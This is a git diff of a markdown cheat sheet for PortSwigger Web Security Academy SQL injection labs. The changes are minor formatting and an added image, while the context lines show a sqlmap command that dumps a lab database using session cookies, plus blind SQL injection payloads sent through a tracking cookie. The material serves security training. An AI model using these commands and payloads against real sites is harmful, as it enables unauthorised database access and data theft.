@@ -24,7 +24,7 @@ if you know the db, put --dbms=postgresql or else run without --dbms flag, it ma
 while running below, it will ask for confirmations, go by default, just click enter.
 sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/filter?category=Lifestyle' --cookie='TrackingId=nDU4jKT9hjQE9mr5; session=PFERWY0rKpJ7bPszXsQKXVAnzmZyBLWq' --level 2 --dbms=postgresql --dump --threads=5
 
-checking for blind sql vulneabilities:
+**checking for blind sql vulneabilities:**
 Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
 
 **identifying blind injection is sql or non-sql.**
@@ -33,6 +33,11 @@ Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
 
  '||(SELECT '' FROM not-a-real-table)||'   -> if returns error, table does not exist.
  '||(SELECT '' FROM users WHERE ROWNUM = 1)||'  -> -> if does not returns error, table exist.
+
+<img width="743" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/f7d1686a-e4c7-45c4-92dd-746d5d26be70">
+
+
+ 
 ## Summary
 
 * [Recon for SQLi Vulnerabilities](#recon)
